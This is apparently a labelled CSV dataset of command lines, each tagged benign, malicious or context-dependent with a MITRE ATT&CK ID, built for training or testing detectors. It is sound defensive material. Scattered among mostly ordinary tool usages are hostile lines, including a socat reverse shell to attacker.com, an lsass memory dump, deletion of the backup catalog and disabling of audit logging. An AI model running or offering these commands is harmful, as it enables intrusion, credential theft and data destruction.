command,label,original_label,mitre_id
steamos-select-branch beta,Benign,Benign,Benign
%SystemRoot%\System32\Wbem\Repository,Malicious,Malicious,T1027
PutLifecycleConfiguration,Malicious,Malicious,T1485
gladtex path/to/input.htex,Benign,Benign,Benign
terraform output,Benign,Benign,Benign
cat /var/log/cron,Context_Dependent,Synthetic,Synthetic
ogrinfo -where 'attribute_name > 42' path/to/input.gpkg layer_name,Benign,Benign,Benign
"find ./default/files -type f -exec chmod ug=rw,o= '{}' \;",Benign,Benign,Benign
find . -newermt “Sep 1 2006” -and \! -newermt “Sep 10 2006”,Benign,Benign,Benign
mac-cleanup [-c|--configure],Benign,Benign,Benign
kiwi-ng -v,Benign,Benign,Benign
ssh -L 5432:localhost:5432 user@10.0.0.100,Context_Dependent,Synthetic,Synthetic
<physical unit='bytes'>5</physical>,Malicious,Malicious,T1222
fisher update,Benign,Benign,Benign
mvn clean site,Benign,Benign,Benign
sudo ls -hal /root/ | sudo dd of=/root/test.out,Context_Dependent,Benign,Benign
uv sync --dry-run,Benign,Benign,Benign
"cat file.json | jello -r '""some text: "" + _.key_name'",Benign,Benign,Benign
podman build [-f|--file] Containerfile.different .,Benign,Benign,Benign
cd .\tmp\victim-files,Malicious,Malicious,T1560
kubectl version --client,Benign,Benign,Benign
[ $(find your/dir -prune -empty) = your/dir ],Benign,Benign,Benign
terraform apply -destroy,Benign,Benign,Benign
cd path/to/test_directory && tmt try,Benign,Benign,Benign
"Set-ItemProperty -Path ""HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager"" -Name ""BootExecute"" -Value ""$registry_value"" -Type MultiString",Malicious,Malicious,T1547
seq 1 10 | perl -ne 'print if ( !eof )' | perl -ne 'print if ( !eof )' | perl -ne 'print if ( !eof )',Benign,Benign,Benign
powershell -OutputFormat Text|XML,Benign,Benign,Benign
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe $output_file,Malicious,Malicious,T1218
wmic process call create,Malicious,Malicious,T1047
firejail --list,Benign,Benign,Benign
"find . -name ""filename"" -and -not -path ""./path/to/filename"" -delete",Benign,Benign,Benign
"skate delete ""key""",Benign,Benign,Benign
gofumpt -w path/to/directory,Benign,Benign,Benign
find `ls -d /[ubso]*` -name sar,Benign,Benign,Benign
check-support-status,Benign,Benign,Benign
diff-pdf --output-diff=path/to/diff.pdf path/to/a.pdf path/to/b.pdf,Benign,Benign,Benign
"find . -type f \( -name ""*.dat"" \) -exec tail -n+5 -q ""$file"" {} + |tee concat.txt",Benign,Benign,Benign
az image create [-g|--resource-group] resource_group [-n|--name] name --os-type windows|linux --source os_disk_source,Benign,Benign,Benign
nixos-option [-r|--recursive] users.users.user,Benign,Benign,Benign
zoxide query string1 string2,Benign,Benign,Benign
rexec [-P|--port] 1234 [-h|--host] remote_host ls -l,Benign,Benign,Benign
windows\system32\,Malicious,Malicious,T1053
"else: import SimpleHTTPServer as s, SocketServer as ss",Malicious,Malicious,T1105
"mp3info -a ""artist_name"" -t ""song_title"" -l ""album_title"" -y year -c ""comment_text"" path/to/file.mp3",Benign,Benign,Benign
fzf [-q|--query] '!pyc travis',Benign,Benign,Benign
"wtype -d 500 -- ""text""",Benign,Benign,Benign
ls **/*.py **/*.html,Benign,Benign,Benign
groff path/to/input.roff > path/to/output.ps,Benign,Benign,Benign
ipconfig /all >> %temp%\download,Context_Dependent,Malicious,T1016
kubectl apply edit-last-applied [-f|--filename] path/to/file,Benign,Benign,Benign
someCommand | tee someFile,Benign,Benign,Benign
pdfgrep [-m|--max-count] 3 [-i|--ignore-case] '^file_name' file.pdf,Benign,Benign,Benign
"find . -name ""article.xml"" -exec rename 's/article/001_article/;' '{}' \;",Benign,Benign,Benign
tput rev,Benign,Benign,Benign
"find /home/jassi/ -type f -name ""aliencoders.[0-9]+""",Context_Dependent,Benign,Benign
dfc,Benign,Benign,Benign
nano path/to/file1 path/to/file2 ...,Benign,Benign,Benign
cat /etc/ssh/ssh_config,Context_Dependent,Synthetic,Synthetic
bing-rewards,Benign,Benign,Benign
find . -type f -print0 | xargs -0 perl -pi -e 's/ +$//',Benign,Benign,Benign
"join -t, -a1 -a2 <(sort file1) <(sort file2)",Benign,Benign,Benign
mongo | tee somefile,Benign,Benign,Benign
fnm [uni|uninstall] node_version,Benign,Benign,Benign
tail [-F|--retry --follow] path/to/file,Benign,Benign,Benign
safe target vault_addr target_name,Benign,Benign,Benign
sudo virt-sysprep [-a|--add] path/to/image.qcow2,Benign,Benign,Benign
New-Item $commandpath -Force | Out-Null,Malicious,Malicious,T1548
"locate ""*/filename""",Benign,Benign,Benign
zeroclaw skills list,Benign,Benign,Benign
ect -strip path/to/file.png,Benign,Benign,Benign
aws ses list-receipt-rule-sets --starting-token token_string --max-items integer --generate-cli-skeleton,Benign,Benign,Benign
rip [-i|--inspect] path/to/file_or_directory1 path/to/file_or_directory2 ...,Benign,Benign,Benign
curlie httpbin.org/get,Benign,Benign,Benign
wsl.exe --exec bash -c 'cat < /dev/tcp/192.168.1.10/54 > binary',Malicious,Malicious,T1105
"find . -type f -name '*.java' -exec sh -c 'iconv -f cp1252 -t utf-8 ""$1"" > converted && mv converted ""$1""' -- {} \;",Benign,Benign,Benign
pulumi stack [hist|history] [-j|--json],Benign,Benign,Benign
stress-ng [-c|--cpu] 4 [-t|--timeout] 60s,Benign,Benign,Benign
"grep ""# THIS IS A COMMENT"" /etc/default/ufw",Malicious,Malicious,T1562
ico -sleep 0.1,Benign,Benign,Benign
ar x path/to/file.a,Benign,Benign,Benign
nomad job validate path/to/file.nomad,Benign,Benign,Benign
gpg [-d|--decrypt] doc.txt.gpg,Benign,Benign,Benign
"SCHTASKS /CREATE /SC DAILY /TN StartDVL /TR ""[path to self]"" /ST 10:00",Malicious,Malicious,T1053
photo_high_resj.png,Malicious,Malicious,T1036
"find . -name '*.txt' -not -name ""all.txt"" | xargs cat > all.txt",Benign,Benign,Benign
pulumi new,Benign,Benign,Benign
nb list,Benign,Benign,Benign
echo User Domain: %USERDOMAIN% >> %file%,Context_Dependent,Malicious,T1033
find . \( -size +700k -and -size -1000k \),Benign,Benign,Benign
{ time sleep 1; } 2>&1 | grep real,Benign,Benign,Benign
docker volume create --label label volume_name,Benign,Benign,Benign
find /tmp/1 -iname '*.txt' -not -iname '[0-9A-Za-z]*.txt',Benign,Benign,Benign
calibredb add path/to/file1 path/to/file2 ...,Benign,Benign,Benign
dexdump -d path/to/file.apk,Benign,Benign,Benign
dot path/to/input.gv | gvcolor | dot -T png > path/to/output.png,Benign,Benign,Benign
gh release [ls|list],Benign,Benign,Benign
pamixer [-d|--decrease] 5 --source ID,Benign,Benign,Benign
"$excelApp.RegisterXLL(""PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x86.xll"")",Malicious,Malicious,T1137
netsh interface portproxy delete v4tov4 listenaddress=192.168.0.1 listenport=8080,Benign,Benign,Benign
powerstat,Benign,Benign,Benign
mysql_secure_installation --host host --port port,Benign,Benign,Benign
makepasswd --string bar,Benign,Benign,Benign
exo compute instance create instance_name --zone zone [-Q|--quiet],Benign,Benign,Benign
pulumi import cloudflare:index/workersScript:WorkersScript my_worker_script account_id/script_name,Benign,Benign,Benign
pacdiff [-s|--sudo] [-b|--backup],Benign,Benign,Benign
cockpit-ws --port port,Benign,Benign,Benign
twurl alias alias_name resource,Benign,Benign,Benign
iproxy --udid device_udid local_port:device_port,Benign,Benign,Benign
phan --init --init-level level,Benign,Benign,Benign
kill `ps ax | grep 'python csp_build.py' | awk '{print $1}'`,Benign,Benign,Benign
"find . -maxdepth 1 -iname ""*.jpg"" | xargs tar -czvf jpeg.tgz",Benign,Benign,Benign
rlwrap [-p|--prompt-colour=]black|red|green|yellow|blue|cyan|purple|white|colour_spec command,Benign,Benign,Benign
comm -23 second-file-sorted.txt first-file-sorted.txt,Benign,Benign,Benign
"bun outdated ""pattern""",Benign,Benign,Benign
hledger print,Benign,Benign,Benign
debugfs -w /dev/sdXN,Benign,Benign,Benign
lwp-request -C username:password -m METHOD http://example.com/some/path,Benign,Benign,Benign
nl -w col_width path/to/file,Benign,Benign,Benign
mbw -n 3 -q -a 512,Benign,Benign,Benign
"find . -type f -name ""*.gz"" -exec zgrep 'GET /foo' {} \;",Benign,Benign,Benign
beanstalkd -l ip_address -p port_number,Benign,Benign,Benign
"su --session-command=""${OBJECTDB_HOME}/bin/objectdb.sh start"" $JAVA_USER",Benign,Benign,Benign
"$orgWallpaper | Out-File -FilePath ""$pointer_to_orginal_wallpaper""",Malicious,Malicious,T1491
ng analytics [on|enable] [-g|--global],Benign,Benign,Benign
doctl [k|kubernetes] [c|cluster] [gu|get-upgrades] cluster_name,Benign,Benign,Benign
"yes ""$OPTARG"" | head -$opt",Benign,Benign,Benign
todo edit --location location_name task_id,Benign,Benign,Benign
find . -regextype posix-egrep -regex '.\*c([3-6][0-9]|70).\*',Benign,Benign,Benign
gcloud sql export sql instance gs://bucket_name/file_name --async,Benign,Benign,Benign
pulumi about [-j|--json],Benign,Benign,Benign
path/to/cs2 -dedicated +map de_dust2,Benign,Benign,Benign
veracrypt [-k|--keyfiles] path/to/keyfile /dev/sdXN path/to/mount_point,Benign,Benign,Benign
pcapfix --deep-scan path/to/file.pcap,Benign,Benign,Benign
bird,Benign,Benign,Benign
"echo ""$password"" | pw usermod $username -h 0",Malicious,Malicious,T1136
openstack volume show volume_id,Benign,Benign,Benign
ifconfig eth0 | grep HWaddr,Context_Dependent,Benign,Benign
crunch 1 5 -o START -c 1000 -z gzip|bzip2|lzma|7z,Benign,Benign,Benign
zip,Malicious,Malicious,T1560
cupsctl --debug-logging|--no-debug-logging,Benign,Benign,Benign
pipewire --config path/to/file.conf,Benign,Benign,Benign
rename -n 's/special/regular/' **,Benign,Benign,Benign
jira sprint [ls|list] --current [-a|--assignee] $(jira me),Benign,Benign,Benign
assoc .txt,Benign,Benign,Benign
/mem,Malicious,Malicious,T1003
"tea login add --name ""name"" --url ""url"" --token ""token""",Benign,Benign,Benign
timg video.mp4,Benign,Benign,Benign
lighthouse --output json --output-path path/to/file.json https://example.com,Benign,Benign,Benign
gzip --help | less,Benign,Benign,Benign
find . 2>&1 | grep -v 'Permission denied' > some_file,Benign,Benign,Benign
linode-cli tickets replies ticket_id,Benign,Benign,Benign
"tar -cf path/to/compressed_file.tar.bz2 [-I|--use-compress-program] ""pbzip2 -option1 -option2 ..."" path/to/file",Benign,Benign,Benign
fold file | wc -l,Benign,Benign,Benign
"dir /s ""c:\Documents and Settings"" >> $output_file",Context_Dependent,Malicious,T1083
prqlc compile,Benign,Benign,Benign
steamcmd +login username +logout +quit,Benign,Benign,Benign
cmd.exe /c %s,Malicious,Malicious,T1059
setarch `uname -m` -R ./yourProgram,Benign,Benign,Benign
cat path/to/file | ident,Benign,Benign,Benign
wajig purge package,Benign,Benign,Benign
mvn archetype:generate --define archetypeGroupId=group_id --define archetypeArtifactId=artifact_id --define archetypeVersion=version --define groupId=project_group_id --define artifactId=project_name --define interactiveMode=false,Benign,Benign,Benign
lspci -k,Benign,Benign,Benign
duti -s com.apple.Safari public.html all,Benign,Benign,Benign
dm-tool add-seat xlocal name=value,Benign,Benign,Benign
find ./cms/djangoapps/contentstore/views -iname *.css | xargs sed -i s/[Ee][Dd][Xx]/gurukul/g,Benign,Benign,Benign
uv publish [-t|--token] your_api_token,Benign,Benign,Benign
brotli path/to/file [-o|--output] path/to/compressed_output_file.br,Benign,Benign,Benign
ionic g page,Benign,Benign,Benign
"socat tcp-connect:attacker.com:12345 exec:/bin/sh,pty,stderr,setsid,sigint,sane",Malicious,Malicious,T1059
sed --in-place '/some string here/d' yourfile,Benign,Benign,Benign
lvm_import_vdo --vdo-config path/to/vdo.conf /dev/mapper/vdo_volume,Benign,Benign,Benign
find . \( -name D -prune \) -o -name hi.dat,Benign,Benign,Benign
jhat -J-mx8G dump_file.bin,Benign,Benign,Benign
"yum list installed --disablerepo=""*"" --enablerepo=""fedora*""",Benign,Benign,Benign
moro report,Benign,Benign,Benign
rm /dev/sdXN,Benign,Benign,Benign
vulkaninfo --html,Benign,Benign,Benign
funzip -password password path/to/archive,Benign,Benign,Benign
stripe logs tail,Benign,Benign,Benign
System.Windows.Forms.Clipboard.GetText(),Malicious,Malicious,T1115
snmpget -v version -c community -O f ip_address oid,Benign,Benign,Benign
xauth remove display_name,Benign,Benign,Benign
checkov --directory path/to/directory,Benign,Benign,Benign
agate path/to/file,Benign,Benign,Benign
find /home -type f -name *.sxw -atime -3 -user bruno,Context_Dependent,Benign,Benign
autopep8 --in-place path/to/file.py,Benign,Benign,Benign
gnome-screenshot --version,Benign,Benign,Benign
openssl enc -in /path/to/input-file -out /path/to/output-file,Malicious,Malicious,T1222
osascript path/to/apple.scpt,Benign,Benign,Benign
wezterm cli activate-pane --pane-id id,Benign,Benign,Benign
"""$procdump_exe"" -accepteula -ma lsass.exe $output_file",Malicious,Malicious,T1003
msbuild.exe @{PATH:.rsp},Malicious,Malicious,T1036
exit N,Benign,Benign,Benign
sudo vgs [-a|--all],Benign,Benign,Benign
kinfocenter [-h|--help],Benign,Benign,Benign
wikiman -h,Benign,Benign,Benign
"(([adsisearcher]'(objectcategory=organizationalunit)').FindAll()).Path | %{if(([ADSI]""$_"").gPlink){Write-Host ""[+] OU Path:""([ADSI]""$_"").Path;$a=((([ADSI]""$_"").gplink) -replace ""[[;]"" -split ""]"");for($i=0;$i -lt $a.length;$i++){if($a[$i]){Write-Host ""Policy Path[$i]:""([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).Path;Write-Host ""Policy Name[$i]:""([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).DisplayName} };Write-Output ""`n"" }}",Context_Dependent,Malicious,T1087
sudo tlmgr key remove key_id,Benign,Benign,Benign
qjoypad --update,Benign,Benign,Benign
tasklist /fo table|list|csv,Benign,Benign,Benign
WantedBy=multi-user.target' >/path/to/temp-file.service,Malicious,Malicious,T1059
pgcli postgresql://user@host/database,Benign,Benign,Benign
find . -type f -exec file {} \; | awk -F: '{if ($2 ~/image/) print $1}',Benign,Benign,Benign
xclip [-o|-out] [-se|-selection] [c|clipboard],Benign,Benign,Benign
py-spy record [-o|--output] path/to/profile.svg [-p|--pid] pid,Benign,Benign,Benign
wbemtool.exe,Malicious,Malicious,T1047
xzdiff --brief path/to/file1 path/to/file2,Benign,Benign,Benign
pdf-parser [-a|--stats] path/to/file.pdf,Benign,Benign,Benign
tidy -config path/to/configuration [-m|-modify] path/to/file.html,Benign,Benign,Benign
docker [logs|container logs] [-f|--follow] container_name,Benign,Benign,Benign
"find /etc -name ""*.conf"" -printf ""%f accessed %AF %Ar, modified %TF %Tr\n""",Benign,Benign,Benign
ln myfile.txt my-hard-link,Benign,Benign,Benign
makoctl dismiss,Benign,Benign,Benign
wkhtmltopdf --orientation Landscape|Portrait input.html output.pdf,Benign,Benign,Benign
ntfyme log,Benign,Benign,Benign
sfdk qmake project,Benign,Benign,Benign
herd list --format txt|xml|json|md,Benign,Benign,Benign
sudo rtcwake [-m|--mode] show [-v|--verbose],Benign,Benign,Benign
java -jar jenkins-cli.jar -s jenkins_server_url -auth username:api_token,Benign,Benign,Benign
"gallery-dl --destination path/to/directory ""url""",Benign,Benign,Benign
systemd-machine-id-setup --print,Benign,Benign,Benign
path/to/goldeneye.py url [-u|--useragents] 100 [-s|--sockets] 200,Benign,Benign,Benign
kaggle [c|competitions] download competition [-f|--file] path/to/file,Benign,Benign,Benign
go tool vet help,Benign,Benign,Benign
archey,Benign,Benign,Benign
ifconfig eth0 | grep -Eo ..\(\:..\){5},Context_Dependent,Benign,Benign
get variable,Benign,Benign,Benign
comm -12 ignore.txt input.txt,Benign,Benign,Benign
gradle dependencyInsight --dependency package_name --configuration configuration_name,Benign,Benign,Benign
soffice --convert-to pdf *.doc,Benign,Benign,Benign
dot_clean -v path/to/directory,Benign,Benign,Benign
"winrm invoke Create wmicimv2/Win32_Service @{Name=""Evil"";DisplayName=""Evil"";PathName=""{CMD}""} -r:http://acmedc:5985 && winrm invoke StartService wmicimv2/Win32_Service?Name=Evil -r:http://acmedc:5985",Malicious,Malicious,T1216
cppcheck . 2> cppcheck.log,Benign,Benign,Benign
"read -p ""command : "" input_cmd",Benign,Benign,Benign
nix-store --delete /nix/store/checksum-package-version.ext,Benign,Benign,Benign
cvs add path/to/file,Benign,Benign,Benign
dscl . -create /Users/$username UserShell /bin/zsh,Malicious,Malicious,T1136
idnits --verbose path/to/file.txt,Benign,Benign,Benign
desc table_name partition (partition_spec);,Benign,Benign,Benign
find /srv -name '*.pem' -type f 2>/dev/null,Context_Dependent,Synthetic,Synthetic
eog path/to/image.png,Benign,Benign,Benign
crystal eval 'code',Benign,Benign,Benign
fuser [-m|--mount] path/to/file_or_directory,Benign,Benign,Benign
pio system prune,Benign,Benign,Benign
abrt-cli remove problem_id,Benign,Benign,Benign
find / -name '#*' -atime +7 -print | xargs rm,Context_Dependent,Benign,Benign
ssh -t SERVER 'command; bash -l',Benign,Benign,Benign
protonvpn disconnect,Benign,Benign,Benign
ppmtv dim_factor path/to/file.ppm > path/to/output.ppm,Benign,Benign,Benign
cradle package update package version,Benign,Benign,Benign
gcrane completion zsh > $(brew --prefix)/share/zsh/site-functions/_gcrane,Benign,Benign,Benign
tre [-h|--help],Benign,Benign,Benign
nix eval nixpkgs#pkg --apply 'lambda_function',Benign,Benign,Benign
hardhat clean,Benign,Benign,Benign
stressapptest -M memory -v level,Benign,Benign,Benign
printenv,Context_Dependent,Benign,Benign
choco install path\to\file,Benign,Benign,Benign
tree $absolute/path/of/your/dir,Benign,Benign,Benign
"mitmdump [-nr|--no-server --read-flows] input_filename [-w|--wfile] output_filename ""~m post""",Benign,Benign,Benign
"codex --oss --local-provider lmstudio|ollama ""your prompt""",Benign,Benign,Benign
systemctl is-active firewalld,Context_Dependent,Synthetic,Synthetic
ffmpeg -i path/to/video.mp4 -vn path/to/sound.mp3,Benign,Benign,Benign
perldoc -L language_code page|module|program|URL,Benign,Benign,Benign
elasticsearch-saml-metadata --realm realm_name --out path/to/file.xml,Benign,Benign,Benign
pgmramp -diagonal path/to/image.pgm > path/to/output.pgm,Benign,Benign,Benign
brew bundle --file path/to/file,Benign,Benign,Benign
.text,Malicious,Malicious,T1055
cordova info,Benign,Benign,Benign
yaa archive -a algorithm -d path/to/directory -o path/to/output_file.yaa,Benign,Benign,Benign
"find / -path ""*/Google/Chrome/*/Bookmarks"" -exec echo {} >> $output_file \;",Context_Dependent,Malicious,T1217
pdfjoin /path/to/file1.pdf 2- file2 last-3 --outfile output_file,Benign,Benign,Benign
cat ${SPOOL_FILE} | tee -a ${LOG_FILE},Benign,Benign,Benign
waypipe ssh user@server,Benign,Benign,Benign
screen -R -O -t mysession -S mysession -f,Benign,Benign,Benign
"find . -type d -name ""0"" -execdir tar -cvf ~/home/directoryForTransfer/filename.tar RS* \;",Benign,Benign,Benign
balena devices,Benign,Benign,Benign
pkg [sh|show] package,Benign,Benign,Benign
"find . -name ""*.pl""",Benign,Benign,Benign
mmdc [-i|--input] input.mmd [-o|--output] output.svg,Benign,Benign,Benign
kubens,Benign,Benign,Benign
kill_unwanted,Malicious,Malicious,T1562
"Select-String -SimpleMatch ""exact_string"" path\to\file",Benign,Benign,Benign
sudo tune2fs -L 'MY_LABEL' /dev/sdXN,Benign,Benign,Benign
aws sqs list-queues,Benign,Benign,Benign
R [-d|--debugger] debugger,Benign,Benign,Benign
shopt -s failglob,Benign,Benign,Benign
compress $* &,Benign,Benign,Benign
pdfseparate -l 10 path/to/source_filename.pdf path/to/destination_filename-%d.pdf,Benign,Benign,Benign
"read -e -p ""Enter the path to the file: "" -i ""/usr/local/etc/"" FILEPATH",Benign,Benign,Benign
eget zyedidia/micro [-t|--tag] v2.0.10,Benign,Benign,Benign
"VSDiagnostics.exe start 2 /launch:{PATH:.exe} /launchArgs:""{CMD:args}""",Malicious,Malicious,T1127
"find . -name '*.andnav' -exec sh -c 'mv ""$0"" ""${0%.andnav}.tile""' {} \;z",Benign,Benign,Benign
net.exe user $user_account $new_password,Malicious,Malicious,T1531
lastcomm,Benign,Benign,Benign
find . -type f -wholename \*.mbox,Benign,Benign,Benign
C:\User\1\,Malicious,Malicious,T1074
grep -i error /var/log/maillog,Context_Dependent,Synthetic,Synthetic
x_x [-d|--delimiter] ';' [-q|--quotechar] '|' file.csv,Benign,Benign,Benign
dnf changelog --count number package,Benign,Benign,Benign
"[K]::keybd_event($VK_R, 0, $KEYDOWN, [UIntPtr]::Zero)",Malicious,Malicious,T1566
cat -v /dev/urandom,Benign,Benign,Benign
chmod o=g path/to/file,Benign,Benign,Benign
gcloud components update --quiet,Benign,Benign,Benign
cryfs path/to/cipher_directory path/to/mount_point,Benign,Benign,Benign
psql database [-f|--file] path/to/file.sql,Benign,Benign,Benign
mv $file $(echo $file | rev | cut -f2- -d- | rev).pkg,Benign,Benign,Benign
omf remove name,Benign,Benign,Benign
nohup php newEmptyPHP.php &,Benign,Benign,Benign
getArch.py -target target,Benign,Benign,Benign
sudo pueue completions fish /usr/share/fish/completions,Benign,Benign,Benign
readlink -f $(which firefox),Benign,Benign,Benign
<Ctrl b><c>,Benign,Benign,Benign
"find /path/to/directory/* -maxdepth 0 -type d -printf ""%P\n"" -exec sudo tar -zcpvf {}.tar.gz {} \;",Benign,Benign,Benign
OpenSSH,Malicious,Malicious,T1129
"cmd.exe /c ping.exe 8.8.8.8 -n 70&&""%temp%\FontEDL.exe""",Malicious,Malicious,T1059
more path\to\file +5,Benign,Benign,Benign
coreutils ls -l,Benign,Benign,Benign
find -maxdepth 2 -name passwd,Benign,Benign,Benign
nh clean profile path/to/profile,Benign,Benign,Benign
distrobox-enter [-n|--name] container_name -- uptime --pretty,Benign,Benign,Benign
ntfs-read.py -extract \windows\system32\config\sam volume,Benign,Benign,Benign
"ps -eo pid,user,args",Context_Dependent,Synthetic,Synthetic
"find . -iname ""*.bak"" -type f -print | xargs /bin/rm -f",Benign,Benign,Benign
mix compile,Benign,Benign,Benign
reflex [-G|--inverse-regex] '^dir/' command,Benign,Benign,Benign
uname -p,Context_Dependent,Synthetic,Synthetic
netsh interface portproxy add v4tov4 listenport=$listenport connectport=$connectport connectaddress=$connectaddress,Malicious,Malicious,T1090
kubie exec context namespace command,Benign,Benign,Benign
nvtop [-d|--delay] 2,Benign,Benign,Benign
evil-winrm [-i|--ip] ip_address [-u|--user] user [-H|--hash] nt_hash,Benign,Benign,Benign
find . -type f -exec perl -i -pe 's/something/another/g' {} \;,Benign,Benign,Benign
bun [a|add] package1 package2 ...,Benign,Benign,Benign
autopkgtest [-B|--no-built-binaries] -- null,Benign,Benign,Benign
"$PathToAtomicsFolder\T1055.012\bin\x64\CreateProcessWithPipe.exe -program ""$hollow_binary_path"" -debug",Malicious,Malicious,T1055
w32tm /query /status /verbose,Benign,Benign,Benign
gfortran -S path/to/source.f90,Benign,Benign,Benign
openscad -o path/to/button.png --colorscheme Sunset path/to/button.scad,Benign,Benign,Benign
aws s3 ls --recursive bucket_name/path/to/directory/prefix,Benign,Benign,Benign
azcopy [c|copy] 'https://source_storage_account_name.blob.core.windows.net/container_name' 'https://destination_storage_account_name.blob.core.windows.net/container_name',Benign,Benign,Benign
nim [c|compile] [-r|--run] path/to/file.nim,Benign,Benign,Benign
conda package [-w|--which] path/to/file,Benign,Benign,Benign
ifstat,Benign,Benign,Benign
dmesg | less,Benign,Benign,Benign
"if [ -f ~/.ssh/authorized_keys ]; then ssh_authorized_keys=$(cat ~/.ssh/authorized_keys); echo ""$ssh_authorized_keys"" > ~/.ssh/authorized_keys; fi;",Malicious,Malicious,T1098
"matlab -r ""run(path/to/script.m)""",Benign,Benign,Benign
routel table_number|main|local|default,Benign,Benign,Benign
magick montage path/to/image1.jpg path/to/image2.jpg ... -geometry 640x480+0+0 path/to/montage.jpg,Benign,Benign,Benign
istats,Benign,Benign,Benign
sudo swapoff [-a|--all],Benign,Benign,Benign
monodevelop,Benign,Benign,Benign
nix flake --help,Benign,Benign,Benign
ddev start,Benign,Benign,Benign
pbmtolj path/to/input.pbm > path/to/output.lj,Benign,Benign,Benign
wbadmin.exe delete catalog -quiet,Malicious,Malicious,T1490
getUsername,Context_Dependent,Malicious,T1033
"find /var/www/vhosts/*/httpdocs/ -type f -wholename *includes/constants.php -exec grep -H ""PHPBB_VERSION"" {} \;",Benign,Benign,Benign
cmd.exe /c del,Malicious,Malicious,T1070
"virt-install [-n|--name] vm_name --memory 1024 --disk path=path/to/image.qcow2,size=12 [-c|--cdrom] path/to/debian.iso",Benign,Benign,Benign
cmatrix -s,Benign,Benign,Benign
"poetry show --without group1,group2,...",Benign,Benign,Benign
redshift -g red:green:blue,Benign,Benign,Benign
"find . -name ""*.png"" -prune -o -name ""*.gif"" -prune -o -name ""*.svn"" -prune -o -print0 | xargs -0 -I FILES grep -IR ""foo="" FILES",Benign,Benign,Benign
sudo rpmconf [-a|--all] [-c|--clean],Benign,Benign,Benign
rsync -aHvz /path/to/sfolder name@remote.server:/path/to/remote/dfolder,Benign,Benign,Benign
audtool current-song,Benign,Benign,Benign
csc.exe -out:{PATH:.exe} {PATH:.cs},Malicious,Malicious,T1127
latex source.tex,Benign,Benign,Benign
find -ls,Benign,Benign,Benign
mpijavac --showme:compile,Benign,Benign,Benign
lpr -# 2 path/to/file,Benign,Benign,Benign
mountpoint [-q|--quiet] path/to/directory,Benign,Benign,Benign
trawl -f wi,Benign,Benign,Benign
mc alias set local http://localhost:9000 access_key secret_key,Benign,Benign,Benign
tldr [-p|--platform] dos cd,Benign,Benign,Benign
swig -go -cgo -intgosize 64 -c++ path/to/swig_file.i,Benign,Benign,Benign
show cdp neighbors,Context_Dependent,Malicious,T1018
pg_upgrade [-k|--link] [-b|--old-bindir] path/to/old_bin [-B|--new-bindir] path/to/new_bin [-d|--old-datadir] path/to/old_data [-D|--new-datadir] path/to/new_data,Benign,Benign,Benign
wiggle path/to/file.patch,Benign,Benign,Benign
nix why-depends --derivation nixpkgs#dependent nixpkgs#dependency,Benign,Benign,Benign
sudo umount path/to/mount_point,Benign,Benign,Benign
scrot [-s|--select],Benign,Benign,Benign
ed,Benign,Benign,Benign
where /R path\to\directory file_pattern,Benign,Benign,Benign
pamcomp [-va|-valign] top|middle|bottom|above|below [-y|-yoff] y_offset path/to/overlay.pam path/to/underlay.pam > path/to/output.pam,Benign,Benign,Benign
scalafmt --config path/to/.scalafmt.conf --test,Benign,Benign,Benign
"echo '{""modules"":[{""type"":""command"",""key"":""x"",""text"":""exec /path/to/command""}]}' >/path/to/temp-file.jsonc",Malicious,Malicious,T1059
poetry run command argument1 argument2 ...,Benign,Benign,Benign
rabbitmq-diagnostics listeners,Benign,Benign,Benign
okular,Benign,Benign,Benign
find . -type d -print0 | tar cf dirstructure.tar --null --files-from - --no-recursion,Benign,Benign,Benign
grc --pty /bin/sh,Malicious,Malicious,T1059
limine-entry-tool --scan,Benign,Benign,Benign
typeorm entity:create --name entity --dir path/to/directory,Benign,Benign,Benign
"auditpol /set /category:""Logon/Logoff"" /success:disable /failure:disable",Malicious,Malicious,T1562
find . |xargs grep search string | sed 's/search string/new string/g',Benign,Benign,Benign
trizen -Qe,Benign,Benign,Benign
cargo init,Benign,Benign,Benign
apm install package,Benign,Benign,Benign
"$wc.DownloadFile($url, $output)",Malicious,Malicious,T1562
tslint --init,Benign,Benign,Benign
who | awk '{ print $1 }',Context_Dependent,Benign,Benign
alacritty --working-directory path/to/directory,Benign,Benign,Benign
pass edit path/to/data,Benign,Benign,Benign
paclock --print,Benign,Benign,Benign
tox [-r|--recreate] -e py27,Benign,Benign,Benign
etcdctl get my/key,Benign,Benign,Benign
aurpublish package_name,Benign,Benign,Benign
